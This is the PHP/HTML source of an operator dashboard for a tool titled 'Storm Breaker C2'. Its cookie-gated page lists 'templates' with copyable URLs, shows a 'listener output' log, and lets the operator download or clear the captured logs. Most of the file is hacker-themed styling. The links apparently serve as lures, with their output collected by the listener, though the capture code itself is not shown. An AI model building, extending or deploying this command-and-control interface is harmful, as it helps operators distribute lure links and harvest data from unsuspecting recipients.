<?php
session_start();
// This must exist and define the login-arc functions
include "./assets/components/login-arc.php";

// --- Authentication Logic (Unchanged) ---
if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }
}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);
}
else {
    header('location: login.php');
    exit(); // Always exit after a redirect
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SB C2 :: v3.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --dark-bg: #0a0a0a;
            --main-color: #00ff41;
            --secondary-color: #008f11;
            --warning-color: #ffc107;
            --danger-color: #ff0033;
            --glow-color: rgba(0, 255, 65, 0.4);
        }

        /* --- Basic Styles (Unchanged) --- */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--dark-bg);
            color: var(--main-color);
            font-family: 'Share Tech Mono', monospace;
            text-shadow: 0 0 5px var(--glow-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            min-height: 100vh;
        }
        body::before {
            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.3) 0, rgba(0,0,0,0.3) 1px, transparent 1px, transparent 2px);
            pointer-events: none; z-index: 1000;
        }
        .container { width: 100%; max-width: 900px; display: flex; flex-direction: column; align-items: center; }
        .header { width: 100%; border: 1px solid var(--secondary-color); padding: 10px 20px; margin-bottom: 20px; box-shadow: 0 0 15px var(--glow-color) inset; }
        .header h1 { font-size: 1.5em; text-transform: uppercase; white-space: nowrap; overflow: hidden; }
        .header h1::after { content: '_'; animation: blink 1s step-end infinite; }
        @keyframes blink { from, to { color: transparent; } 50% { color: var(--main-color); } }

        /* --- Custom Hacker-style Scrollbar (Unchanged) --- */
        ::-webkit-scrollbar { width: 10px; height: 10px; }
        ::-webkit-scrollbar-track { background: var(--dark-bg); border-left: 1px solid var(--secondary-color); }
        ::-webkit-scrollbar-thumb { background: var(--secondary-color); border: 1px solid var(--main-color); }
        ::-webkit-scrollbar-thumb:hover { background: var(--main-color); box-shadow: 0 0 10px var(--glow-color); }

        /* --- Styling for the Links Section (Unchanged) --- */
        #links-container { width: 100%; border: 1px solid var(--secondary-color); padding: 20px; margin-bottom: 20px; min-height: 100px; }
        .link-item { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding: 5px; background: rgba(0, 15, 0, 0.2); }
        .link-item .name { margin-right: 15px; white-space: nowrap; }
        .link-item .url { flex-grow: 1; color: var(--warning-color); text-shadow: 0 0 5px var(--warning-color); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .copy-btn { background: transparent; border: 1px solid var(--main-color); color: var(--main-color); padding: 5px 10px; margin-left: 15px; cursor: pointer; transition: all 0.2s ease; }
        .copy-btn:hover { background-color: var(--main-color); color: var(--dark-bg); text-shadow: none; }

        /* --- Styles for Textarea (Unchanged) --- */
        #result { background-color: rgba(0,15,0,0.2); border: 1px solid var(--secondary-color); color: var(--danger-color); text-shadow: 0 0 5px var(--danger-color); font-family: inherit; font-size: 1em; padding: 15px; width: 100%; resize: vertical; box-shadow: 0 0 10px var(--glow-color) inset; }
        #result:focus { outline: none; border-color: var(--main-color); box-shadow: 0 0 15px var(--glow-color) inset, 0 0 10px var(--glow-color); }
        #result::placeholder { color: var(--secondary-color); opacity: 0.7; }

        /* --- Styles for Buttons (Unchanged) --- */
        .controls { display: flex; flex-wrap: wrap; justify-content: center; width: 100%; margin-top: 20px; }
        .btn { background: transparent; border: 1px solid; font-family: inherit; font-size: 0.9em; padding: 10px 20px; margin: 5px; cursor: pointer; text-transform: uppercase; transition: all 0.2s ease; }
        .btn:hover { color: var(--dark-bg); text-shadow: none; }
        .btn-danger { border-color: var(--danger-color); color: var(--danger-color); text-shadow: 0 0 5px var(--danger-color); }
        .btn-danger:hover { background-color: var(--danger-color); box-shadow: 0 0 10px var(--danger-color); }
        .btn-success { border-color: var(--main-color); color: var(--main-color); }
        .btn-success:hover { background-color: var(--main-color); box-shadow: 0 0 10px var(--glow-color); }
        .btn-warning { border-color: var(--warning-color); color: var(--warning-color); text-shadow: 0 0 5px var(--warning-color); }
        .btn-warning:hover { background-color: var(--warning-color); box-shadow: 0 0 10px var(--warning-color); }

        /* --- NEW: Custom SweetAlert Popup Styling --- */
        .swal2-popup.hacker-swal {
            background-color: var(--dark-bg);
            border: 1px solid var(--main-color);
            box-shadow: 0 0 20px var(--glow-color);
        }
        .swal2-popup.hacker-swal .swal2-title {
            color: var(--main-color);
            text-shadow: 0 0 5px var(--glow-color);
        }
        .swal2-popup.hacker-swal .swal2-html-container {
            color: #ccc;
        }
    </style>
</head>

<body id="ourbody" onload="check_new_version()">

<div class="container">
    <header class="header">
        <h1 id="heading-text"></h1>
    </header>

    <div id="links-container">
        <p>> Fetching available templates...</p>
    </div>

    <textarea id="result" rows="15" placeholder="[ awaiting listener output... ]"></textarea>

    <div class="controls">
        <button class="btn btn-danger" id="btn-listen">> Stop Listener</button>
        <button class="btn btn-success" onclick="saveLogsAndNotify()">> Download Logs</button>
        <button class="btn btn-warning" id="btn-clear">> Clear Logs</button>
    </div>
</div>

<script>
    // --- Typing effect for the heading (Unchanged) ---
    const heading = document.getElementById('heading-text');
    const text = 'Storm Breaker C2 :: Log Terminal';
    let i = 0;
    function typeWriter() {
        if (i < text.length) {
            heading.innerHTML += text.charAt(i);
            i++;
            setTimeout(typeWriter, 75);
        }
    }
    document.addEventListener('DOMContentLoaded', typeWriter);

    // --- Fetch and Display Links (Unchanged) ---
    document.addEventListener('DOMContentLoaded', function() {
        const linksContainer = document.getElementById('links-container');
        
        fetch('list_templates.php')
            .then(response => {
                if (!response.ok) { throw new Error(`Network Error: ${response.statusText}`); }
                return response.json();
            })
            .then(links => {
                linksContainer.innerHTML = '';
                if (links.length === 0) {
                    linksContainer.innerHTML = '<p style="color: var(--warning-color)">> No templates found in /templates/ directory.</p>';
                    return;
                }
                links.forEach(link => {
                    const itemHTML = `
                        <div class="link-item">
                            <span class="name">> ${link.name}</span>
                            <span class="url">${link.url}</span>
                            <button class="copy-btn" onclick="copyToClipboard('${link.url}', this)">Copy</button>
                        </div>`;
                    linksContainer.insertAdjacentHTML('beforeend', itemHTML);
                });
            })
            .catch(error => {
                console.error('Failed to fetch links:', error);
                linksContainer.innerHTML = `<p style="color: var(--danger-color)">> ERROR: Could not load templates. Check console for details.</p>`;
            });
    });

    // --- Helper function for the "Copy" button (Unchanged) ---
    function copyToClipboard(text, buttonElement) {
        navigator.clipboard.writeText(text).then(() => {
            const originalText = buttonElement.textContent;
            buttonElement.textContent = 'Copied!';
            buttonElement.style.color = 'var(--dark-bg)';
            buttonElement.style.backgroundColor = 'var(--main-color)';
            setTimeout(() => {
                buttonElement.textContent = originalText;
                buttonElement.style.color = '';
                buttonElement.style.backgroundColor = '';
            }, 2000);
        });
    }

    // --- NEW: Function to save the log file and show a popup notification ---
    function saveLogsAndNotify() {
        const logContent = document.getElementById('result').value;
        const fileName = 'log.txt';

        // This function should be defined in your script.js file
        // It handles the actual file download
        if (typeof saveTextAsFile === 'function') {
            saveTextAsFile(logContent, fileName);

            // Show a success popup after the save function is called
            Swal.fire({
                title: 'FILE SAVED',
                text: `The log has been saved as ${fileName}`,
                icon: 'success',
                background: 'var(--dark-bg)',
                customClass: {
                    popup: 'hacker-swal'
                },
                confirmButtonText: 'Acknowledged',
                confirmButtonColor: 'var(--secondary-color)',
            });
        } else {
            console.error('Error: saveTextAsFile function is not defined.');
            // Show an error popup if the save function doesn't exist
            Swal.fire({
                title: 'Execution Error',
                text: 'The required save function could not be found.',
                icon: 'error',
                background: 'var(--dark-bg)',
                customClass: {
                    popup: 'hacker-swal'
                },
                confirmButtonText: 'Understood',
                confirmButtonColor: 'var(--danger-color)',
            });
        }
    }
</script>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>

</body>
</html>